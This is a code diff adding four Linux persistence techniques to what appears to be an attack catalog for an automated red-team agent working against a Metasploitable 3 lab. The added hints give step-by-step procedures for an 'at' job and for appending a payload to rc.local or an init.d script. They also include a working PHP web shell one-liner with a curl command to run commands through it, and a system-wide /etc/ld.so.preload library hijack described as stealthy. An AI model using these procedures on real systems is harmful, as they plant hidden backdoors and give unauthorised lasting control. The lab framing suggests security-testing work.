@@ -71,6 +71,18 @@ _PERSISTENCE: list[Technique] = [
         ),
     ),
     Technique(
+        id="T1053.002", slug="at_job", tactic="persistence",
+        name="Scheduled Task/Job: At",
+        min_privilege="user",
+        procedure_hint=(
+            "One-shot scheduler — complements cron, useful when crond is flaky. "
+            "echo 'date >> /tmp/.hb' | at now + 1 minute; confirm it queued with atq. "
+            "Prove EXECUTION like the cron heartbeat: after the minute, cat /tmp/.hb "
+            "expects a timestamp line. Needs the atd daemon and the `at` binary; if "
+            "absent, fall back to cron. atq alone is NOT proof."
+        ),
+    ),
+    Technique(
         id="T1098.004", slug="ssh_key", tactic="persistence",
         name="Account Manipulation: SSH Authorized Keys",
         min_privilege="user", requires=("ssh_open",),
@@ -80,6 +92,19 @@ _PERSISTENCE: list[Technique] = [
             "Prove it with: ssh -i <key> -o StrictHostKeyChecking=no <user>@<target> id. "
             "Requires sshd on the target (port 22). Inject the REAL pubkey text, never "
             "a <PUBKEY> placeholder."
+        ),
+    ),
+    Technique(
+        id="T1505.003", slug="web_shell", tactic="persistence",
+        name="Server Software Component: Web Shell",
+        min_privilege="user", requires=("web_root_writable",),
+        procedure_hint=(
+            "Drop a minimal web shell into a served webroot (e.g. /var/www/html for "
+            "Apache) — PHP: <?php system($_GET['c']); ?>. Persistence over HTTP as the "
+            "web-server user. Prove EXECUTION from Kali with "
+            "curl 'http://<target>/<name>.php?c=id' expecting a uid= line — a written "
+            "file alone is NOT proof. Only viable with a writable webroot + a live web "
+            "server (MS3: Apache / Drupal / Continuum)."
         ),
     ),
     Technique(
@@ -103,6 +128,19 @@ _PERSISTENCE: list[Technique] = [
         ),
     ),
     Technique(
+        id="T1037.004", slug="rc_local", tactic="persistence",
+        name="Boot or Logon Init Scripts: RC Scripts",
+        min_privilege="root",
+        procedure_hint=(
+            "Boot persistence for NON-systemd Linux (MS3 ub1404 = upstart/init — the "
+            "correct root boot technique here, where systemd is absent). Append a "
+            "payload line before 'exit 0' in /etc/rc.local (ensure it stays "
+            "executable), OR drop /etc/init.d/<name> and run update-rc.d <name> "
+            "defaults. Prove the entry is present + executable; a boot-fired payload "
+            "can also drop a /tmp artifact to confirm. Needs root."
+        ),
+    ),
+    Technique(
         id="T1543.002", slug="systemd_service", tactic="persistence",
         name="Create or Modify System Process: Systemd Service",
         min_privilege="root",
@@ -112,6 +150,19 @@ _PERSISTENCE: list[Technique] = [
             "Prove with systemctl is-active <name> (expect 'active') and is-enabled "
             "(expect 'enabled'). Needs root and a systemd target (MS3 ub1404 uses "
             "upstart/init — prefer an init.d script or cron there)."
+        ),
+    ),
+    Technique(
+        id="T1574.006", slug="ld_preload", tactic="persistence",
+        name="Hijack Execution Flow: Dynamic Linker Hijacking",
+        min_privilege="root",
+        procedure_hint=(
+            "System-wide library injection: compile a small .so with a constructor "
+            "payload (gcc on target or cross-build on Kali to the target ABI), then "
+            "add its path to /etc/ld.so.preload so it loads into every dynamically "
+            "linked process. Stealthy but harder to verify — confirm the "
+            "/etc/ld.so.preload entry AND trigger a benign dynamic binary so the "
+            "constructor fires (e.g. drop a /tmp artifact). Needs root."
         ),
     ),
 ]
